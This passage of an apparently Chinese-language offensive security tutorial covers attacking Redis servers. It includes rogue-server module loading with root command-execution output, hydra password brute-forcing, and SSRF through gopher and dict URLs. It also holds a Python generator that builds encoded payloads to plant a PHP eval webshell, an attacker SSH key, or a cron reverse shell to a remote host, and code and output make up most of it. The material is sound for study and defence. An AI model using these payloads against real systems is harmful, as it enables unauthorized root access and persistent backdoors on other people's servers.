        remote.do("SLAVEOF NO ONE")

        # Operations here
        interact(remote)

        # clean up
        remote.do("CONFIG SET dbfilename dump.rdb")
        remote.shell_cmd("rm ./exp.so")
        remote.do("MODULE UNLOAD system")
```
- 漏洞复现
漏洞影响版本

```
4.x-5.x
```

目标主机信息

```
Version：4.0.9
IP：192.33.6.129
Port：6379
OS：Ubuntu18.6
```

注入恶意SO文件：[@n0b0dyCN](https://github.com/n0b0dyCN)师傅已编译好的so文件

```
λ  Qftm &gt;&gt;&gt;: python3 redis-rogue-server.py --rhost 192.33.6.129 --rport 6379 --lhost 192.168.8.185 --lport 8888
TARGET 192.33.6.129:6379
SERVER 192.168.8.185:8888
[&lt;-] b'*3\r\n$7\r\nSLAVEOF\r\n$13\r\n192.168.8.185\r\n$4\r\n8888\r\n'
[-&gt;] b'+OK\r\n'
[&lt;-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
[-&gt;] b'+OK\r\n'
[-&gt;] b'PING\r\n'
[&lt;-] b'+PONG\r\n'
[-&gt;] b'REPLCONF listening-port 6379\r\n'
[&lt;-] b'+OK\r\n'
[-&gt;] b'REPLCONF capa eof capa psync2\r\n'
[&lt;-] b'+OK\r\n'
[-&gt;] b'PSYNC 00f576097336784081eea872806f343b9852dbd8 1\r\n'
[&lt;-] b'+FULLRESYNC ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ 1\r\n$44320\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'......b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00J\xa6\x00\x00\x00\x00\x00\x00\xd3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n'
[&lt;-] b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n'
[-&gt;] b'+OK\r\n'
[&lt;-] b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
[-&gt;] b'+OK\r\n'
[&lt;&lt;]
```

脚本内RCE

```
[&lt;&lt;] whoami
[&lt;-] b'*2\r\n$11\r\nsystem.exec\r\n$6\r\nwhoami\r\n'
[-&gt;] b'$5\r\nroot\n\r\n'
[&gt;&gt;] root
[&lt;&lt;] id
[&lt;-] b'*2\r\n$11\r\nsystem.exec\r\n$2\r\nid\r\n'
[-&gt;] b'$39\r\nuid=0(root) gid=0(root) groups=0(root)\n\r\n'
[&gt;&gt;] uid=0(root) gid=0(root) groups=0(root)
[&lt;&lt;]
```

redis连接目标主机：执行恶意命令（效果同上）

```
192.33.6.129:6379&gt; system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
192.33.6.129:6379&gt;
```

清除后门文件：exit

```
[&lt;&lt;] exit
[&lt;-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n'
[-&gt;] b'+OK\r\n'
[&lt;-] b'*2\r\n$11\r\nsystem.exec\r\n$11\r\nrm ./exp.so\r\n'
[-&gt;] b'$0\r\n\r\n'
[&lt;-] b'*3\r\n$6\r\nMODULE\r\n$6\r\nUNLOAD\r\n$6\r\nsystem\r\n'
[-&gt;] b'+OK\r\n'
```
- 主从复制RCE优势
对于现在服务器(云服务器)的发展部署，容器化部署成为热潮，单一的容器对应单一的服务，也就导致redis容器服务中很难包括除redis服务以外的任何服务【不限于SSH服务、WWW服务等】，针对这个问题也就导致以往普遍的redis未授权利用手法变得不在适用，很难通过特定目录写入特定恶意文件来取得服务器权限。

然而，redis4.x之后新增的模块拓展功能打破了这个限制，使攻击者可以利用注入恶意so文件来达到任意命令执行直接获得服务器主机权限。

### <a class="reference-link" name="%E5%85%AC%E7%BD%91Redis%E6%9C%AA%E6%8E%88%E6%9D%83+%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB"></a>公网Redis未授权+反序列化攻击

redis中经常会存储各种序列化后的数据，而攻击者往往会将其中的序列化后的数据进行修改为恶意数据，当应用程序读取redis里面的数据并反序列化使用的时候就可能会达到一定的攻击效果。

> redis 反序列化本质上不是 redis 的漏洞，而是使用 redis 的应用反序列化了 redis 的数据而引起的漏洞，redis 本就是一个缓存服务器，用于存储一些缓存对象，所以在很多场景下 redis 里存储的都是各种序列化后的对象数据。

当Redis存在未授权攻击时，攻击者可以通过直接修改 Redis 中序列化后的数据，改为恶意的相应序列化payload，之后等待相关的服务应用程序读取该数据并反序列化处理该数据之后就会造成相应的攻击。

相关分析文章：
- [Spring Data Redis &lt;=2.1.0反序列化漏洞](https://xz.aliyun.com/t/2339)
- [细数 redis 的几种 getshell 方法-反序列化](https://paper.seebug.org/1169/#_3)
- [掌阅iReader某站Python漏洞挖掘](https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html)
### <a class="reference-link" name="%E5%85%AC%E7%BD%91Redis%E6%9C%AA%E6%8E%88%E6%9D%83+%E7%9B%B8%E5%85%B3CVE"></a>公网Redis未授权+相关CVE

针对低版本的redis未授权攻击，在写入常规恶意文件无法成功利用的情况下可以考虑使用如下相关漏洞来获取目标服务主机的相应权限。
- CVE-2016-8339
Redis 远程代码执行漏洞(CVE-2016-8339)

Redis 3.2.x &lt; 3.2.4版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis数据结构存储的CONFIG SET命令中client-output-buffer-limit选项处理存在越界写漏洞。构造的CONFIG SET命令可导致越界写，代码执行。
- CVE-2015-8080
Redis 2.8.x在2.8.24以前和3.0.x 在3.0.6以前版本，`lua_struct.c`文件中的`getnum`函数存在整数溢出漏洞，远程攻击者可借助较大的数字利用该漏洞造成拒绝服务（内存损坏和应用程序崩溃）。
- CVE-2015-4335
Redis 2.8.1之前版本和3.0.2之前3.x版本中存在安全漏洞。远程攻击者可执行eval命令利用该漏洞执行任意Lua字节码。

相关文章:

[Redis LUA Exploit](https://tanzu.vmware.com/security/redis-lua-sandbox)

[Redis CVE-2015-4335分析](https://cloud.tencent.com/developer/news/256777)
- CVE-2013-7458
读取“.rediscli_history”配置文件信息。

### <a class="reference-link" name="%E5%85%AC%E7%BD%91Redis%E6%8E%88%E6%9D%83+%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3"></a>公网Redis授权+口令猜解

如果redis服务设置了密码认证，且密码复杂度低，则可以通过暴力破解的方式获取密码
- 利用hydra暴力破解redis的密码
```
$ hydra -P passwords.txt redis://x.x.x.x:xx
```

Testing

```
→ Qftm :~/Desktop# hydra -P redis_pass.txt redis://192.33.6.129:6379
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-11 22:58:32
[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:1/p:12), ~1 try per task
[DATA] attacking redis://192.33.6.129:6379/
[6379][redis] host: 192.33.6.129   password: rootroot
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-11 22:58:33
 → Qftm :~/Desktop#
```

### <a class="reference-link" name="%E5%86%85%E7%BD%91Redis%E6%9C%AA%E6%8E%88%E6%9D%83+SSRF%E6%94%BB%E5%87%BB"></a>内网Redis未授权+SSRF攻击

有关redis的部署大多都是存在于内网，redis3.2之后默认绑定了本地IP地址`127.0.0.1`并开启了保护模式也就导致了默认的redis无法远程接入，自此存在于公网的redis逐渐消失，同时对于redis的攻击利用难度也越来越高。

但是，如果相关主机服务器存在SSRF服务端请求伪造攻击漏洞就可以突破内网限制进行内网应用探测、访问攻击内网应用服务，例如：使用SSRF攻击内网redis应用、攻击内网 Vulnerability Web等。

<a class="reference-link" name="Gopher%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3"></a>**Gopher协议详解**

<a class="reference-link" name="%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B"></a>**协议简介**

> Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，gopher是Internet上最主要的信息检索工具，gopher站点也是最主要的站点，使用tcp70端口。
Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。 Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。

<a class="reference-link" name="%E5%8D%8F%E8%AE%AE%E6%A0%BC%E5%BC%8F"></a>**协议格式**

```
# 格式里面的特殊字符'_'不一定是它也可以是其他特殊字符，因为gopher协议默认会吃掉一个字符
gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流

gopher的默认端口是70

如果发起post请求，回车换行需要使用%0d%0a，如果存在多个参数，参数之间的&amp;也需要进行URL编码
```

<a class="reference-link" name="%E5%8D%8F%E8%AE%AE%E9%80%9A%E4%BF%A1"></a>**协议通信**

Gopher协议可以用于传输TCP数据【支持多行数据传输】，那么也就可以构造特定数据包发起相应的网络请求（GET、POST等）

在gopher协议中发送HTTP请求，一般需要以下几步

```
1、构造相应请求的HTTP数据包  

2、URL编码(包括回车换行)

3、gopher协议请求
```
- 简单TCP数据传输
数据传递（默认吃掉一个字符：’_’）

```
→ Qftm :~# curl gopher://192.33.6.150:9999/_tcpdata
 ^C
 → Qftm :~#
```

数据监听

```
→ Qftm :~/Desktop# nc -lvp 9999
listening on [any] 9999 ...
192.33.6.150: inverse host lookup failed: Host name lookup failure
connect to [192.33.6.150] from (UNKNOWN) [192.33.6.150] 48546
tcpdata
 → Qftm :~/Desktop#
```
- 发起HTTP GET请求
get.php

```
&lt;?php
echo "Hello ".$_GET["name"];
?&gt;
```

http请求GET数据包

```
GET /get.php?name=admin HTTP/1.1
Host: 192.33.6.150
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

编码处理

```
GET%20%2Fget.php%3Fname%3Dadmin%20HTTP%2F1.1%0D%0AHost%3A%20192.33.6.150%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28dows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A78.0%29Gecko%2F20100101%20Firefox%2F78.0%0D%0AAccept%3A%20text%2Fhtml%2Capplication%2Fxhtml%2Bxml%2Capplication%2Fxml%3Bq%3D0.9%2Cimage%2Fwebp%2C*%2F*%3Bq%3D0.8%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AConnection%3A%20close%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0ACache-Control%3A%20max-age%3D0%0D%0A
```

PS：注意GET数据包中末尾的回车换行（不可以丢掉）

gopher请求构造

```
gopher://192.33.6.150:80/_GET%20%2Fget.php%3Fname%3Dadmin%20HTTP%2F1.1%0D%0AHost%3A%20192.33.6.150%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28dows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A78.0%29Gecko%2F20100101%20Firefox%2F78.0%0D%0AAccept%3A%20text%2Fhtml%2Capplication%2Fxhtml%2Bxml%2Capplication%2Fxml%3Bq%3D0.9%2Cimage%2Fwebp%2C*%2F*%3Bq%3D0.8%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AConnection%3A%20close%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0ACache-Control%3A%20max-age%3D0%0D%0A
```

请求响应

```
→ Qftm :/var/www/html# curl gopher://192.33.6.150:80/_GET%20%2Fget.php%3Fname%3Dadmin%20HTTP%2F1.1%0D%0AHost%3A%20192.33.6.150%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28dows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A78.0%29Gecko%2F20100101%20Firefox%2F78.0%0D%0AAccept%3A%20text%2Fhtml%2Capplication%2Fxhtml%2Bxml%2Capplication%2Fxml%3Bq%3D0.9%2Cimage%2Fwebp%2C*%2F*%3Bq%3D0.8%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AConnection%3A%20close%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0ACache-Control%3A%20max-age%3D0%0D%0A
HTTP/1.1 200 OK
Date: Tue, 11 Aug 2020 11:26:34 GMT
Server: Apache/2.4.41 (Debian)
Content-Length: 11
Connection: close
Content-Type: text/html; charset=UTF-8

Hello admin → Qftm :/var/www/html#

```
- 发起HTTP POST请求
post.php

```
&lt;?php
echo "Hello ".$_POST["name"];
?&gt;
```

http请求POST数据包

```
POST /post.php HTTP/1.1
Host: 192.33.6.150
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Cache: no-cache
Origin: moz-extension://f19fffa3-b1f4-4453-897c-10bbedb54344
Content-Length: 10
Connection: close

name=admin

```

编码处理

```
POST%20%2Fpost.php%20HTTP%2F1.1%0D%0AHost%3A%20192.33.6.150%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A78.0%29%20Gecko%2F20100101%20Firefox%2F78.0%0D%0AAccept%3A%20*%2F*%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0ACache%3A%20no-cache%0D%0AOrigin%3A%20moz-extension%3A%2F%2Ff19fffa3-b1f4-4453-897c-10bbedb54344%0D%0AContent-Length%3A%2010%0D%0AConnection%3A%20close%0D%0A%0D%0Aname%3Dadmin
```

gopher请求构造

```
gopher://192.33.6.150:80/_POST%20%2Fpost.php%20HTTP%2F1.1%0D%0AHost%3A%20192.33.6.150%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A78.0%29%20Gecko%2F20100101%20Firefox%2F78.0%0D%0AAccept%3A%20*%2F*%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0ACache%3A%20no-cache%0D%0AOrigin%3A%20moz-extension%3A%2F%2Ff19fffa3-b1f4-4453-897c-10bbedb54344%0D%0AContent-Length%3A%2010%0D%0AConnection%3A%20close%0D%0A%0D%0Aname%3Dadmin
```

请求响应

```
→ Qftm :/var/www/html# curl gopher://192.33.6.150:80/_POST%20%2Fpost.php%20HTTP%2F1.1%0D%0AHost%3A%20192.33.6.150%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A78.0%29%20Gecko%2F20100101%20Firefox%2F78.0%0D%0AAccept%3A%20*%2F*%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0ACache%3A%20no-cache%0D%0AOrigin%3A%20moz-extension%3A%2F%2Ff19fffa3-b1f4-4453-897c-10bbedb54344%0D%0AContent-Length%3A%2010%0D%0AConnection%3A%20close%0D%0A%0D%0Aname%3Dadmin
HTTP/1.1 200 OK
Date: Tue, 11 Aug 2020 11:28:09 GMT
Server: Apache/2.4.41 (Debian)
Content-Length: 11
Connection: close
Content-Type: text/html; charset=UTF-8

Hello admin → Qftm :/var/www/html#

```

<a class="reference-link" name="Dict%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3"></a>**Dict协议详解**

<a class="reference-link" name="%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B"></a>**协议简介**

Dict协议，一个字典服务器协议(A Dictionary Server Protocol)

官方文档介绍：[A Dictionary Server Protocol](http://www.dict.org/rfc2229.txt)

> 词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。

<a class="reference-link" name="%E5%8D%8F%E8%AE%AE%E6%A0%BC%E5%BC%8F"></a>**协议格式**

```
dict://&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;:&lt;database&gt;:&lt;n&gt;
   dict://&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;:&lt;port&gt;/m:&lt;word&gt;:&lt;database&gt;:&lt;strat&gt;:&lt;n&gt;
```

<a class="reference-link" name="%E5%8D%8F%E8%AE%AE%E9%80%9A%E4%BF%A1"></a>**协议通信**

对于dict协议传输的数据仅仅支持单行数据的传输，并且数据里面不能带有空格，空格后的字符默认不传输，这里应该是curl处理问题，后续ssrf通过浏览器测试则利用空格也成功【字符’:’代替字符空格’ ‘】

```
# 正常数据传输
→ Qftm :/var/www/html# curl dict://192.33.6.150:9999/testing
^C
 → Qftm :/var/www/html# 
 → Qftm :~/Desktop# nc -lvp 9999
listening on [any] 9999 ...
192.33.6.150: inverse host lookup failed: Unknown host
connect to [192.33.6.150] from (UNKNOWN) [192.33.6.150] 48578
CLIENT libcurl 7.67.0
testing
QUIT
 → Qftm :~/Desktop#

 # 空格截断后续数据传输
 → Qftm :/var/www/html# curl dict://192.33.6.150:9999/testing qftm
^C
 → Qftm :/var/www/html# 
 → Qftm :~/Desktop# nc -lvp 9999
listening on [any] 9999 ...
192.33.6.150: inverse host lookup failed: Unknown host
connect to [192.33.6.150] from (UNKNOWN) [192.33.6.150] 48602
CLIENT libcurl 7.67.0
testing
QUIT
 → Qftm :~/Desktop# 
 → Qftm :~/Desktop# curl dict://192.33.6.150:9999/testing%20qftm
^C
 → Qftm :~/Desktop#
 → Qftm :~/Desktop# nc -lvp 9999
listening on [any] 9999 ...
192.33.6.150: inverse host lookup failed: Unknown host
connect to [192.33.6.150] from (UNKNOWN) [192.33.6.150] 48668
CLIENT libcurl 7.67.0
testing%20qftm
QUIT
 → Qftm :~/Desktop#

 # 空格等价替换【按照协议格式来（字符':'）】
 → Qftm :/var/www/html# curl dict://192.33.6.150:9999/testing:qftm
^C
 → Qftm :/var/www/html# 
 → Qftm :~/Desktop# nc -lvp 9999
listening on [any] 9999 ...
192.33.6.150: inverse host lookup failed: Host name lookup failure
connect to [192.33.6.150] from (UNKNOWN) [192.33.6.150] 48604
CLIENT libcurl 7.67.0
testing qftm
QUIT
 → Qftm :~/Desktop#
```

ssrf(空格)

```
GET /index.php?url=dict://127.0.0.1:6379/config%20get%20bind HTTP/1.1
Host: 192.33.6.129
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cache: no-cache
Origin: moz-extension://f19fffa3-b1f4-4453-897c-10bbedb54344
Connection: close

HTTP/1.1 200 OK
Date: Wed, 12 Aug 2020 10:03:27 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 106
Connection: close
Content-Type: text/html; charset=UTF-8

-ERR Syntax error, try CLIENT (LIST | KILL | GETNAME | SETNAME | PAUSE | REPLY)
*2
$4
bind
$0

+OK

```

对于dict协议的使用主要在于端口服务的探测和一些服务简单命令的使用

```
# 端口刺探
 → Qftm :/var/www/html# curl dict://192.33.6.129:22/
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4
Protocol mismatch.
curl: (56) Recv failure: Connection reset by peer
 → Qftm :/var/www/html# 

 # 命令执行
 → Qftm :/var/www/html# curl dict://192.33.6.129:6379/get:qftm
-ERR Syntax error, try CLIENT (LIST | KILL | GETNAME | SETNAME | PAUSE | REPLY)
$6
hacker
+OK
 → Qftm :/var/www/html#

```

<a class="reference-link" name="ssrf+redis%E5%B8%B8%E8%A7%84%E6%94%BB%E5%87%BB"></a>**ssrf+redis常规攻击**

由于gopher协议可以传输redis的数据报文，也就可以达到类似之前对redis的连接、设置、存储等一系列操作。在这种情况下ssrf+gopher(dict)即可对内网redis等应用进行一定程度上的攻击，一些常见的操作如下：有关每部分具体分析见上面相关部分的详细分析

借鉴@七友师傅脚本处理思路，编写集成几种常规利用方式的payload处理（后续其它手段亦可添加）

```
# -*- coding: utf-8 -*-
"""
 @Author: Qftm
 @Data  : 2020/8/12
 @Time  : 10:31
 @IDE   : IntelliJ IDEA
"""
import urllib

protocol = "gopher://"
ip = "127.0.0.1"
port = "6379"
passwd = ""
payload = protocol + ip + ":" + port + "/_"

def redis_resp_format(arr):
    CRLF = "\r\n"
    redis_arr = arr.split(" ")
    cmd = ""
    cmd += "*"+str(len(redis_arr))
    for x in redis_arr:
        cmd += CRLF+"$"+str(len((x.replace("$`{`IFS`}`"," "))))+CRLF+x.replace("$`{`IFS`}`"," ")
    cmd += CRLF
    return cmd

if __name__ == "__main__":

    print("##################### SSRF+Gopher-&gt;Redis Mode Choice #####################")
    print("#")
    print("# Mode 1：写入 Webshell For Web Service -&gt; Effective dir")
    print("#")
    print("# Mode 2：写入 SSH Public Key For Linux OS -&gt; /root/.ssh/")
    print("#")
    print("# Mode 3：写入 定时任务 For CentOS -&gt; /var/spool/cron/")
    print("#")
    print("# Mode N：待添加 +++++++++++")
    print("#")
    print("##################### SSRF+Gopher-&gt;Redis Mode Choice #####################")

    try:
        mode = input("Choice Mode：")
        mode = int(mode)
        if mode == 1:
            shell = "\n\n&lt;?php eval($_GET[\"qftm\"]);?&gt;\n\n"
            dbfilename = "test.php"
            dir = "/var/www/html/"
            # 标志位'$`{`IFS`}`'替换某部分空格，避免后续命令的分割出现问题
            cmd = ["flushall",
                   "set x `{``}`".format(shell.replace(" ","$`{`IFS`}`")),
                   "config set dir `{``}`".format(dir),
                   "config set dbfilename `{``}`".format(dbfilename),
                   "save",
                   "quit"
                   ]
            if passwd:
                cmd.insert(0,"AUTH `{``}`".format(passwd))
            for x in cmd:
                payload += urllib.request.quote(redis_resp_format(x))
            print(payload)
        elif mode == 2:
            ssh_key_pub = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHStzQa4aESwm/Rm/caKPQAblnb6OBCpxpCeahB2WKwnwoT6DuZ1ypzgYTjMEP6BOhySnSatDpdn7wZKUL7ZEaJdSAd0qD/QaHHLFMYvNXrGJQC+9JBvt5X5iUJOx5Ukdu36YXxRib4cw2qhDLnKa2Q96pEInVJcZ02VNxHTvAE+vjhCTQSYPJahin/s/a+IYEcjqyvkiuWVDWg2GMViMwq5Yh/ELZG2KAXNpSNx1TjklXYQVPO2dmPCdUYyy1r+WxEjWLJZPPWQntQc6KiqHmkEGBXGB4fVxScCVR8y2/DEzEqsQcveFWw7mhqfp9kNHP+AOv0wFwL9G8/glZEnGB root@rose\n\n"
            dbfilename = "authorized_keys"
            dir = "/root/.ssh/"
            # 标志位'$`{`IFS`}`'替换某部分空格，避免后续命令的分割出现问题
            cmd=["flushall",
                 "set x `{``}`".format(ssh_key_pub.replace(" ","$`{`IFS`}`")),
                 "config set dir `{``}`".format(dir),
                 "config set dbfilename `{``}`".format(dbfilename),
                 "save",
                 "quit"
                 ]
            if passwd:
                cmd.insert(0,"AUTH `{``}`".format(passwd))
            for x in cmd:
                payload += urllib.request.quote(redis_resp_format(x))
            print(payload)
        elif mode == 3:
            crontab = "\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.33.6.150/9999 0&gt;&amp;1\n\n"
            dbfilename = "root"
            dir = "/var/spool/cron/"
            # 标志位'$`{`IFS`}`'替换某部分空格，避免后续命令的分割出现问题
            cmd = ["flushall",
                   "set x `{``}`".format(crontab.replace(" ","$`{`IFS`}`")),
                   "config set dir `{``}`".format(dir),
                   "config set dbfilename `{``}`".format(dbfilename),
                   "save",
                   "quit"
                   ]
            if passwd:
                cmd.insert(0,"AUTH `{``}`".format(passwd))
            for x in cmd:
                payload += urllib.request.quote(redis_resp_format(x))
            print(payload)

    except Exception as e:
        print(e)
```

<a class="reference-link" name="%E5%86%99%E5%85%A5Webshell"></a>**写入Webshell**

**（1）Gopher协议利用**
- 原始payload
```
flushall
set x '&lt;?php eval($_GET["qftm"]);?&gt;'
config set dir /var/www/html/
config set dbfilename test.php
save
quit
```
- resp数据格式转换
```
##################### SSRF+Gopher-&gt;Redis Mode Choice #####################
#
# Mode 1：写入 Webshell For Web Service -&gt; Effective dir
#
# Mode 2：写入 SSH Public Key For Linux OS -&gt; /root/.ssh/
#
# Mode 3：写入 定时任务 For CentOS -&gt; /var/spool/cron/
#
# Mode N：待添加 +++++++++++
#
##################### SSRF+Gopher-&gt;Redis Mode Choice #####################
Choice Mode：1
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0Ax%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22qftm%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2414%0D%0A/var/www/html/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%248%0D%0Atest.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A

Process finished with exit code 0
```
- 二次编码：服务端默认会对gopher数据进行一次url解码
```
gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250Ax%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_GET%255B%2522qftm%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252414%250D%250A%2Fvar%2Fwww%2Fhtml%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25248%250D%250Atest.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A
```
- 攻击效果
[![](https://p4.ssl.qhimg.com/t0102d5927e0b934135.png)](https://p4.ssl.qhimg.com/t0102d5927e0b934135.png)

**（2）Dict协议利用**

这里除了使用gopher协议利用外，同样也可以使用dict协议进行攻击利用，该协议不仅仅限于内网刺探，具体攻击手段如下【区别只是前者支持多行数据传输后者仅支持单行】
- 组合payload
```
dict://127.0.0.1:6379/flushall
dict://127.0.0.1:6379/set:x:'&lt;?php:eval($_GET["qftm"]);?&gt;'
dict://127.0.0.1:6379/config:set:dir:/var/www/html/
dict://127.0.0.1:6379/config:set:dbfilename:test.php
dict://127.0.0.1:6379/save
```
- 问题探索
利用组合payload攻击，但是会发现其中一条指令执行报错：`set:x:'&lt;?php:eval($_GET["qftm"]);?&gt;'`，报错信息为：`-ERR Protocol error: unbalanced quotes in request`

经测试发现是因为其中的一个特殊字符而导致的致命报错，该字符就是：`?`，测试过程如下

```
→ Qftm :~/Desktop# curl dict://192.33.6.150:9999/'aaa?bbb'
^C
 → Qftm :~/Desktop# 
 → Qftm :~/Desktop# nc -lvp 9999
listening on [any] 9999 ...
192.33.6.150: inverse host lookup failed: Unknown host
connect to [192.33.6.150] from (UNKNOWN) [192.33.6.150] 48714
